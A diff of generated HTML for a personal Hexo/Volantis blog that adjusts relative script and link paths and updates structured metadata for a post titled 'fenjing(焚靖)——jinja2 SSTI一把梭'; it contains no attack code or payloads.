+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2580,13 +2651,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2627,7 +2699,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="social-wrapper" itemprop="about" itemscope itemtype="http://schema.org/Thing">
           
             
-              <a href="../../atom.xml"
+              <a href="../../../../atom.xml"
                 class="social fas fa-rss flat-btn"
                 target="_blank"
                 rel="external nofollow noopener noreferrer" itemprop="url">
@@ -2636,7 +2708,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
           
             
-              <a href="../../mailto:yixinbc@foxmail.com"
+              <a href="../../../../mailto:yixinbc@foxmail.com"
                 class="social fas fa-envelope flat-btn"
                 target="_blank"
                 rel="external nofollow noopener noreferrer" itemprop="url">
@@ -2710,7 +2782,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <!-- internal -->
 
-<script src="../../../../js/app.js"></script>
+<script src="../../../../../../../../js/app.js"></script>
 
 
 
@@ -2726,19 +2798,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
       const sites_api = document.getElementById('sites-api');
       if (sites_api != undefined && typeof SitesJS === 'undefined') {
-        volantis.js("../../js/plugins/tags/sites.js")
+        volantis.js("../../../../js/plugins/tags/sites.js")
       }
     
     
       const friends_api = document.getElementById('friends-api');
       if (friends_api != undefined && typeof FriendsJS === 'undefined') {
-        volantis.js("../../js/plugins/tags/friends.js")
+        volantis.js("../../../../js/plugins/tags/friends.js")
       }
     
     
       const contributors_api = document.getElementById('contributors-api');
       if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
-        volantis.js("../../js/plugins/tags/contributors.js")
+        volantis.js("../../../../js/plugins/tags/contributors.js")
       }
     
   };
@@ -2865,7 +2937,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   function loadSearchScript() {
     // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
-    return volantis.js("../../js/search/hexo.js");
+    return volantis.js("../../../../js/search/hexo.js");
   }
 
   function loadSearchService() {
@@ -3114,7 +3186,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"yixinBC's blog","url":"https://yixinbc.tech/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/","sameAs":["https://github.com/volantis-x"],"description":"yixinBC的个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://yixinbc.tech/","name":"yixinBC's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"https://yixinbc.tech/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"https://yixinbc.tech/archives/2023/","name":"2023年"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"yixinBC's blog","url":"https://yixinbc.tech/","keywords":null,"description":"yixinBC的个人博客","author":{"@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/","description":"yixinBC的个人博客"},"publisher":{"@type":"Organization","name":"yixinBC's blog","url":"https://yixinbc.tech/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://yixinbc.tech?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"yixinBC的个人博客","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/"},"publisher":{"@type":"Organization","name":"yixinBC's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"yixinBC's blog","url":"https://yixinbc.tech/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/","sameAs":["https://github.com/volantis-x"],"description":"yixinBC的个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://yixinbc.tech/","name":"yixinBC's blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https://yixinbc.tech/2023/05/11/fenjing/","name":"fenjing(焚靖)——jinja2 SSTI一把梭"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"yixinBC's blog","url":"https://yixinbc.tech/","keywords":null,"description":"yixinBC的个人博客","author":{"@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/","description":"yixinBC的个人博客"},"publisher":{"@type":"Organization","name":"yixinBC's blog","url":"https://yixinbc.tech/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://yixinbc.tech?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"fenjing(焚靖)——jinja2 SSTI一把梭","description":"yixinBC的个人博客","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://yixinbc.tech/2023/05/11/fenjing/"},"author":{"@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/"},"publisher":{"@type":"Organization","name":"yixinBC's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://yixinbc.tech/2023/05/11/fenjing/","wordCount":0,"datePublished":"2023-05-11T18:36:24.000Z","dateModified":"2023-05-11T11:37:03.816Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
